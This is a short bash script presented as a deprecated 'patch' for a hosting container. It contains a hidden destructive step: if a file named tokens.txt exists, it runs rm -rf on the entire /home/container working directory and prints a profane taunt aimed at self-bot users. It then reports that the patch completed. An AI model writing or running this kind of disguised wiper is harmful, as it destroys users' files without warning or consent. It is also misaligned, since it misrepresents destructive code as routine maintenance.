#! /bin/bash

echo "This patch system is deprecated. It will be integrated in moonlight in the future"

cd /home/container

if [ -f "tokens.txt" ]; then
    rm -rf "$(pwd)"
    echo "No self bots. Fuck you ;)"
fi

echo "Main patch complete"
